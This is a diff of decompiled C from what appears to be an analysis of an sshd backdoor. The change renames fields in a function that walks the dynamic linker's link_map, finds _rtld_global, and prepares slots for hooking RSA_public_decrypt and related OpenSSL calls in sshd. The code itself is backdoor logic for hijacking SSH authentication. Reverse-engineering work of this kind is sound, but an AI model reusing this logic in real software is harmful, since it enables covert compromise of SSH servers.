@@ -39,7 +39,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   if (r_map == (link_map *)0x0) {
     return FALSE;
   }
-  rtld_global_sym = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
+  rtld_global_sym = elf_symbol_get(data->elf_handles->ldso,STR_rtld_global,0);
   if (rtld_global_sym == (Elf64_Sym *)0x0) {
     return FALSE;
   }
@@ -131,7 +131,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
         if (shared_maps->ldso_link_map != (link_map *)0x0) {
           return FALSE;
         }
-        elf_info = data->elf_handles->dynamic_linker;
+        elf_info = data->elf_handles->ldso;
         rtld_global_ptr = elf_info->elfbase->e_ident + rtld_global_sym->st_value;
         if (r_map <= rtld_global_ptr) {
           return FALSE;
@@ -156,7 +156,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   rsa_get0_key_slot = data->rsa_get0_key_slot;
   evp_set1_rsa_slot = data->evp_set1_rsa_slot;
   rsa_public_decrypt_slot = data->rsa_public_decrypt_slot;
-  elf_info = data->elf_handles->main;
+  elf_info = data->elf_handles->sshd;
   map_cursor = data->shared_maps->sshd_link_map;
   if (map_cursor == (link_map *)0x0) {
     return FALSE;
